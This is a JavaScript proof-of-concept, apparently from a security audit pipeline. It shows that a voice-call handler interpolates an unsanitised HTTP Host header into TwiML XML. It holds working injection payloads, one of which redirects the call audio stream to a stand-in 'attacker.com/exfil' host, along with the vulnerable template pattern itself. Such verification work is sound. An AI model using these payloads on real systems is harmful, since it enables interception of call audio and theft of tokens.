 * PoC: H3 — TwiML Host Injection via HTTP Host header
 *
 * Demonstrates that buildTwiMLPayload() in realtime-handler.ts
 * interpolates req.headers.host verbatim into TwiML XML when
 * this.publicOrigin is null/unset. An attacker supplying a crafted
 * Host header can:
 *   1. Break out of the url="..." attribute and inject arbitrary XML.
 *   2. Redirect Twilio's audio WebSocket to an attacker-controlled host.
 *
 * Strategy: unit-style — instantiate a minimal stub that reproduces
 * exactly the vulnerable template-literal path without needing live
 * Twilio infra.  No network calls are made.
 */

"use strict";

// ---------------------------------------------------------------------------
// Reproduce the verbatim template logic from realtime-handler.ts:332-345
// ---------------------------------------------------------------------------

const DEFAULT_HOST = "localhost";

/**
 * Minimal reproduction of buildTwiMLPayload()
 * with publicOrigin=null (operator has not called setPublicUrl).
 */
function buildTwiMLPayload(reqHeaders, streamPathPattern, token) {
  const host = /* publicOrigin= */ null || reqHeaders.host || DEFAULT_HOST;
  const wsUrl = `wss://${host}${streamPathPattern}/${token}`;
  const twiml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Connect>
    <Stream url="${wsUrl}" />
  </Connect>
</Response>`;
  return {
    statusCode: 200,
    headers: { "Content-Type": "text/xml" },
    body: twiml,
  };
}

// ---------------------------------------------------------------------------
// Attack 1: attribute break-out — inject a second attribute + close tag
// ---------------------------------------------------------------------------

const MALICIOUS_HOST_ATTR_BREAK =
  'evil.attacker.com/voice/stream/realtime/fake" /><Stream url="wss://attacker.com/exfil/token123';

const SAFE_STREAM_PATH = "/voice/stream/realtime";
const SAFE_TOKEN = "legit-token-abc";

const resultAttrBreak = buildTwiMLPayload(
  { host: MALICIOUS_HOST_ATTR_BREAK },
  SAFE_STREAM_PATH,
  SAFE_TOKEN
);

console.log("=== Attack 1: XML attribute break-out ===");
console.log(resultAttrBreak.body);
console.log();

const attrBreakSuccess =
  resultAttrBreak.body.includes('url="wss://attacker.com/exfil/') &&
  resultAttrBreak.body.includes("<Stream") &&
  (resultAttrBreak.body.match(/<Stream/g) || []).length >= 2;

// ---------------------------------------------------------------------------
// Attack 2: stream redirect — point Twilio at attacker WebSocket host
// ---------------------------------------------------------------------------

const MALICIOUS_HOST_REDIRECT = "attacker.com";

const resultRedirect = buildTwiMLPayload(
  { host: MALICIOUS_HOST_REDIRECT },
  SAFE_STREAM_PATH,
  SAFE_TOKEN
);

console.log("=== Attack 2: stream URL redirect ===");
console.log(resultRedirect.body);
console.log();

const redirectSuccess = resultRedirect.body.includes("wss://attacker.com/");

// ---------------------------------------------------------------------------
// Attack 3: XML entity / CDATA injection via host header
// ---------------------------------------------------------------------------

const MALICIOUS_HOST_XML =
  'legit.example.com" /><inject>PWNED</inject><Stream url="wss://legit.example.com';

const resultXmlInject = buildTwiMLPayload(
  { host: MALICIOUS_HOST_XML },
  SAFE_STREAM_PATH,
  SAFE_TOKEN
);

console.log("=== Attack 3: arbitrary XML element injection ===");
console.log(resultXmlInject.body);
console.log();

const xmlInjectSuccess = resultXmlInject.body.includes("<inject>PWNED</inject>");

// ---------------------------------------------------------------------------
// Verdict
// ---------------------------------------------------------------------------

console.log("--- Summary ---");
console.log(`Attack 1 (attr break-out):    ${attrBreakSuccess ? "CONFIRMED" : "FAILED"}`);
console.log(`Attack 2 (stream redirect):   ${redirectSuccess ? "CONFIRMED" : "FAILED"}`);
console.log(`Attack 3 (XML element inject): ${xmlInjectSuccess ? "CONFIRMED" : "FAILED"}`);
console.log();

const allConfirmed = attrBreakSuccess && redirectSuccess && xmlInjectSuccess;

// MUST be the last stdout line — parsed by poc-executor
console.log(
  JSON.stringify({
    status: allConfirmed ? "confirmed" : "failed",
    evidence: allConfirmed
      ? "attacker-controlled Host header injected into TwiML <Stream url=> attribute: arbitrary XML elements and redirect URL appear verbatim in response body"
      : "one or more attack vectors did not produce expected XML injection in response body",
    notes:
      "publicOrigin=null (operator default); source line extensions/voice-call/src/webhook/realtime-handler.ts:332",
  })
);
